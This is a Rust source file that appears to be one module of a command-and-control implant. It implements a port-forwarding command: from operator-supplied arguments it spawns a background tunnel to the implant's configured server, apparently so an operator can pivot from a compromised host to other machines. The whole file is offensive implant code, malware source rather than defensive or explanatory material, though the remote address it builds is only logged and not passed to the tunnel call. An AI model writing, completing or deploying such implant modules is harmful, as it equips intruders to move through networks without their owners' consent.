// implant/src/commands/portfwd.rs
use super::CommandHandler;
use crate::config::Config;
use anyhow::{anyhow, Result};
use serde_json::Value;
use std::sync::Arc;
use uuid::Uuid;

pub struct PortFwdHandler {
    config: Arc<Config>,
}

impl PortFwdHandler {
    pub fn new(config: Config) -> Self {
        Self {
            config: Arc::new(config),
        }
    }
}

impl CommandHandler for PortFwdHandler {
    fn execute(&self, args: Value) -> Result<Value> {
        let rhost = args["rhost"]
            .as_str()
            .ok_or_else(|| anyhow!("missing rhost"))?
            .to_string();
        let rport = args["rport"]
            .as_u64()
            .ok_or_else(|| anyhow!("missing rport"))? as u16;
        let session_id = args["session_id"]
            .as_str()
            .map(|s| s.to_string())
            .unwrap_or_else(|| Uuid::new_v4().to_string());
        let remote = format!("{rhost}:{rport}");
        let cfg = Arc::clone(&self.config);
        let sid = session_id.clone();
        let remote_log = remote.clone();
        tokio::spawn(async move {
            if let Err(e) = crate::tunnel_client::run_tunnel(&cfg, "portfwd", &sid).await {
                eprintln!("[!] PortFwd ({remote_log}): {e}");
            }
        });
        Ok(serde_json::json!({
            "status": "started",
            "session_id": session_id,
            "remote": remote,
        }))
    }
}
